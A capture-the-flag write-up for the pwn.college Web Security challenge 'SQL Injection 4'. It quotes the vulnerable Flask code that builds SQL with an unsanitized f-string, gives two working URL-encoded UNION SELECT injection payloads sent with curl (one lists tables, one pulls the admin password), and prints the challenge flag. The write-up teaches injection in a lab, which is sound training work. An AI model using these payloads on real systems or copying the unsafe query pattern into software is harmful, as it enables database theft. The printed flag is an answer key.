---
layout: page
title: "SQL Injection 4 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Challenge Overview

In this challenge, we are given a Flask-based web server connected to a temporary SQLite database. The app allows us to input a `query` parameter that is inserted directly into an SQL `LIKE` clause.

Our goal is to extract the flag stored in a dynamically named table (e.g., `users_7505663899`), which contains the admin's password as the flag.

---

## 🔍 Source Code Analysis

Here's what matters:

```python
query = flask.request.args.get("query", "%")
sql = f'SELECT username FROM {random_user_table} WHERE username LIKE "{query}"'
```
- The query input is not sanitized, and is directly injected into a SQL query.
- This makes it vulnerable to SQL Injection.
- The admin's password (flag) is stored in a random users_* table created as:

```
random_user_table = f"users_{random.randrange(2**32, 2**33)}"
db.execute(f"""CREATE TABLE {random_user_table} AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
```

---

## Exploitation Steps
### Step 1: Enumerate Tables
Payload (URL-encoded):
```bash
curl "http://challenge.localhost/?query=%22%20UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20--"
```
Response:
```
Results:
users_7505663899
```
We now know the target table name: users_7505663899.

### Step 2: Extract the Flag
Payload (URL-encoded):
```bash
curl "http://challenge.localhost/?query=%22%20UNION%20SELECT%20password%20FROM%20users_7505663899%20WHERE%20username=%27admin%27%20--"
```
Response:
```
Results:
pwn.college{QUTh7W8kmKT8fMNQQy8CiFYZCf3.QXykzMzwSM0IzMyEzW}
```
---

## Flag

``` bash
pwn.college{QUTh7W8kmKT8fMNQQy8CiFYZCf3.QXykzMzwSM0IzMyEzW}
```
---
